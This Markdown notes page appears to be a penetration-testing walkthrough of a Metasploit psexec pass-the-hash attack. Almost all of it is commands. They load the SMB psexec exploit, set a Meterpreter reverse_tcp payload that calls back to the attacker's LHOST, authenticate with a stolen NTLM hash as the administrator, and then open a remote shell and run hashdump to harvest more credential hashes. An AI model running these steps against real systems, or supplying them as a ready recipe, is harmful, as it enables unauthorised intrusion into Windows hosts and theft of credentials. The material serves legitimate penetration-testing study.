---
title: "psexec pass the hash"
# search:
#   exclude: true

hide:
#   - navigation
  - toc
  #- footer
---

## PSEXEC PASS THE HASH

<https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/>

assuming that you already have the NTLM `username:ntlm-hash`, you can then run the reverse tcp shell

```bash
# start metasploit meterpreter  
msfconsole

# search for the windows smb `psexec` exploit
msf > search psexec

# "load" the exploit to use  
msf > use exploit/windows/smb/psexec

# list the available configuration options to `set` for the exploit  
msf exploit(psexec) > show options

# using the `psexec` exploit, we will send the `reverse_tcp` shell payload
msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp

# set the LocalHost for the reverse shell connect to
msf exploit(psexec) > set LHOST 192.XXXXX

# set the LocalPort for the reverse shell connect to
msf exploit(psexec) > set LPORT 443

# set the RemoteHost (the target) that we are going to run the exploit and payload against to
msf exploit(psexec) > set RHOST 192.XXXXXX

# why not?! list all configuration options to see if we are happy with it
msf exploit(psexec) > show options

# set the username 
msf exploit(psexec) > set SMBUser Administrator

# set the SMBPassword, the NTLM that we have
msf exploit(psexec) > set SMBPass 00000000000000000000000000000000:8846f7eaee8fb117ad06bdd830b7586c


# run `exploit` to execute the exploit AND the payload
msf exploit(psexec) > exploit
```

If the above executes successfully, you can then drop "into" into a shell on the remote host  
meterpreter > `shell`

you can also run `hasdump` to dump any additional NTLM hash
meterpreter > `run post/windows/gather/hashdump`
